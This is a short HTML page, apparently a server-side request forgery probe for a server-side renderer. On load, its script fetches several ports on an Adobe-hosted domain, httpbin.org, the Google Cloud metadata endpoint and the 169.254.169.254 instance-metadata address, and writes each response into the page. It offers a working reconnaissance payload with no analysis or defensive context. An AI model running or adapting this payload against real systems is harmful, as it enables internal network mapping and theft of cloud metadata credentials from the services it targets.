<!DOCTYPE html>
<html><body>
<h1>PORT_PROBE</h1>
<div id="r1">INITIAL</div>
<div id="r2">INITIAL</div>
<div id="r3">INITIAL</div>
<div id="r4">INITIAL</div>
<div id="r5">INITIAL</div>
<div id="r6">INITIAL</div>
<div id="r7">INITIAL</div>
<div id="r8">INITIAL</div>
<script>
function syncFetch(id, url) {
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, false);
    xhr.send();
    document.getElementById(id).innerText = id + ' [' + xhr.status + '] ' + xhr.responseText.substr(0, 500);
  } catch(e) {
    document.getElementById(id).innerText = id + ' [ERR] ' + e.message.substr(0,200);
  }
}

setTimeout(function() {
  // Test different ports on known-working domain
  syncFetch('r1', 'https://hz-app-attribute-store.adobe.io:443/health');
  syncFetch('r2', 'https://hz-app-attribute-store.adobe.io:8443/health');
  syncFetch('r3', 'https://hz-app-attribute-store.adobe.io:8080/health');
  syncFetch('r4', 'https://hz-app-attribute-store.adobe.io:9090/health');
  // Test HTTPS to well-known external services for baseline
  syncFetch('r5', 'https://httpbin.org/headers');
  syncFetch('r6', 'https://httpbin.org/ip');
  // Test HTTPS to Google metadata (they might have a HTTPS endpoint)
  syncFetch('r7', 'https://metadata.google.internal/computeMetadata/v1/');
  syncFetch('r8', 'https://169.254.169.254/latest/meta-data/');
}, 0);
</script>
</body></html>
